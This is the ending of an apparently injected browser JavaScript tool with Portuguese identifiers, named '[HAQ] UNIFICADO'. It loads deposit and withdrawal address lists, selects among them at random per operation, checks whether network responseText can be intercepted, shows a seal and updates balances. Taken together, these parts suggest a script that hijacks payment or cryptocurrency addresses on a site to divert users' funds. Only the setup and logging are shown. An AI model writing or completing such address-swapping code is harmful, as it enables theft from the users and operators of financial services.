      desligarSelo();
      window.__HAQ = null;
      console.log('[HAQ] removido.');
    }
  };

  ligarSelo();

  var depArmadas = Object.keys(DEPOSITO).filter(function (k) { return k !== 'IGUAL' && DEPOSITO[k].length; });
  var saqArmadas = Object.keys(SAQUE).filter(function (k) { return k !== 'IGUAL' && SAQUE[k].length; });

  console.log('%c[HAQ] UNIFICADO v' + VERSAO, 'color:#400;font-weight:bold');
  console.log('   DEPOSITO: ' + depArmadas.length + ' familias (' + depArmadas.join(', ') + ')');
  console.log('   SAQUE:    ' + saqArmadas.length + ' familias (' + saqArmadas.join(', ') + ')');
  console.log('   sorteio:  aleatorio a cada operacao (deposito) e por fluxo (saque)');
  if (!PODE_LER) console.error('[DEP] responseText nao interceptavel neste navegador.');
  if (!depArmadas.length && !DEPOSITO.IGUAL) console.warn('[DEP] nenhum endereco preenchido em DEPOSITO.');
  if (!saqArmadas.length && !SAQUE.IGUAL) console.warn('[SAQUE] nenhum endereco preenchido em SAQUE.');

  atualizarSaldos();
})();
